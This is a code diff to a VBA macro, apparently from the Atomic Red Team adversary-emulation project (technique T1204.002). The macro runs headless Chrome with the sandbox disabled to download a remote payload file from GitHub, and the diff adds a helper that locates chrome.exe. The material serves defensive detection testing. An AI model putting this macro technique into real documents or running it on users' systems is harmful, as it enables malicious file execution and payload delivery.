@@ -4,9 +4,9 @@ Private Sub ExecChrome()
     Dim exec As Object
     Dim url As String
     
-    url = "https://raw.githubusercontent.com/amasmuggleavocados/atomic-red-team/scriptcontrol/atomics/T1204.002/src/payload.txt"
+    url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/tree/master/atomics/T1204.002/src/payload.txt"
 
-    cmd = "aREPLACEMEa --headless "
+    cmd = findChrome & " --headless "
     cmd = cmd & "--no-sandbox --enable-logging --disable-gpu "
     cmd = cmd & "--dump-dom " & url
     
@@ -70,5 +70,25 @@ Function CreateWindow()
             Err.Clear
         Next
     Loop
+
+End Function
+
+Function findChrome()
+
+    Dim x86Path As String
+    Dim x64Path As String
+    
+    x64Path = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+    x86Path = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+    
+    If Dir(x86Path) = "" Then
+        If Dir(x64Path) = "" Then
+            MsgBox "Google Chrome is not installed, please install"
+        Else
+            findChrome = x64Path
+        End If
+    Else
+        findChrome = x86Path
+    End If
 
 End Function
